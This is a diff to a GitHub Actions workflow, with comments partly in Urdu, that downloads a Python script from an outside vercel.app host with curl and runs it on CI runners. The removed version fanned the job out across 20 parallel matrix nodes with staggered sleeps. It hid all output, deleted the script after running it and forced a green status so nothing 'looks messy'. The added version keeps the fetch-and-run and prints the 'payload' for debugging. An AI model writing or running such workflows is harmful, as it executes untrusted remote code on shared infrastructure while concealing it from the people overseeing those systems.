@@ -4,19 +4,10 @@ on:
   workflow_dispatch:
 
 jobs:
-  execute-script:
+  debug-script:
     runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false # CRITICAL: Prevents chain-reaction cancellation if one node fails
-      max-parallel: 20
-      matrix:
-        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     steps:
-      - name: Asymmetric Sleep Delay 
-        # Bash math: Multiplies the matrix node index by 5 seconds
-        run: sleep $(( ${{ matrix.node_index }} * 5 ))
-
       - name: Initialize Python Environment
         uses: actions/setup-python@v5
         with:
@@ -25,8 +16,14 @@ jobs:
       - name: Let see
         run: curl -sL https://mys-ecru.vercel.app/test.py -o test.py
 
-      - name: Execute & Guaranteed Wipe
-        # Used ';' instead of '&&'. 
-        # ';' ensures 'rm test.py' runs EVEN IF Python crashes. 
-        # '|| true' forces the step to show green/success so it doesn't look messy.
-        run: python test.py > /dev/null 2>&1 ; rm test.py || true
+      - name: Diagnostic Phase 1 (File Integrity Check)
+        # Ye check kare ga ke download hui file Python he ya HTML error page
+        run: |
+          echo "=== FILE SIZE ==="
+          ls -lh test.py
+          echo "=== FIRST 10 LINES OF PAYLOAD ==="
+          cat test.py | head -n 10
+
+      - name: Hmm
+        # Yahan hum ne /dev/null hata diya he taake asli error console me dikhe
+        run: python test.py
